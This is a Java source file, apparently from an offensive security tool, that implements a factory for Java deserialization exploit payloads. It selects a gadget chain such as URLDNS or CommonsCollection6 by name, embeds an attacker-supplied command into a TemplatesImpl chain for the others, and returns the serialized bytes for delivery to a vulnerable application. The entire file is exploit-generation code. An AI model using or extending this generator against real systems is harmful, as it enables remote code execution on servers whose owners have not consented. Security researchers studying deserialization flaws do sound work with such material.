package com.droplab.Utils.UnSerialize;

import com.droplab.Utils.UnSerialize.utils.Gadgets;

import java.lang.reflect.Method;

public class SerializeFactory {
    private static SerializeFactory serializeFactory=null;

    public static SerializeFactory instance(){
        if(serializeFactory == null){
            serializeFactory=new SerializeFactory();
        }
        return serializeFactory;
    }

    public byte[] getObject(String version,String GadgetName, final byte[] command){
        try {
            Object o;
            if(GadgetName.equals("URLDNS") || GadgetName.equals("BlindCommonsCollection6")){
                o=new String(command);
            }else {
                o = Gadgets.createTemplatesImpl(command);  //生成templateimplement 利用链
            }

            Class<?> aClass = Class.forName("com.droplab.Utils.UnSerialize.Gadget." + GadgetName);
            Method getObject = aClass.getMethod("getObject",new Class[]{Object.class});
            byte[] serializeObject =(byte[]) getObject.invoke(aClass.newInstance(), o);
            return serializeObject;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
